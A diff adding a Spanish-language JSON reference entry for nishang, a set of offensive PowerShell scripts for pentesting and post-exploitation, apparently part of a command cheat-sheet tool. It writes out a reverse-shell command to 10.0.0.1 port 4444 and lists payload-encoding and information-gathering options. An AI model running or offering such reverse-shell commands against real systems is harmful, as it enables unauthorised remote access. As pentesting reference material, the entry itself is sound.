@@ -1,0 +1,30 @@
+{
+  "id": "nishang",
+  "title": "nishang — Scripts PowerShell ofensivos",
+  "description": "Colección de scripts de PowerShell para pentesting y post-explotación.",
+  "syntax": "Import-Module Nishang.psm1",
+  "examples": [
+    {
+      "cmd": "Import-Module .\\Nishang.psm1",
+      "desc": "Carga el módulo."
+    },
+    {
+      "cmd": "Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 4444",
+      "desc": "Shell reversa."
+    }
+  ],
+  "options": [
+    {
+      "flag": "Invoke-PowerShellTcp",
+      "desc": "Shell reversa."
+    },
+    {
+      "flag": "Invoke-Encode",
+      "desc": "Codifica payloads."
+    },
+    {
+      "flag": "Get-Information",
+      "desc": "Recolecta info."
+    }
+  ]
+}
